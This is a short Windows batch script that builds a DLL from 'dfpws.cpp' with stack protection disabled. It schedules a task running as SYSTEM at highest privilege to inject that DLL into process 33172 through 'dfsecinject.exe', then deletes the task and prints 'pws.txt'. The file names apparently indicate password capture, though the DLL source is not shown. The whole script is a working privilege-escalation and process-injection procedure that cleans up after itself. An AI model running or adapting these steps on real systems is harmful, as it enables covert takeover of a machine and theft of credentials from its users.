@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfpws.cpp /Fe:dfpws.dll /link user32.lib > pws_build.log 2>&1
echo PWSB=%errorlevel%
type pws_build.log
schtasks /create /tn dfa_pws /tr "C:\Users\User\trackA\dfsecinject.exe 33172 C:\Users\User\trackA\dfpws.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_pws
ping -n 15 127.0.0.1 >nul
schtasks /delete /tn dfa_pws /f >nul
type pws.txt
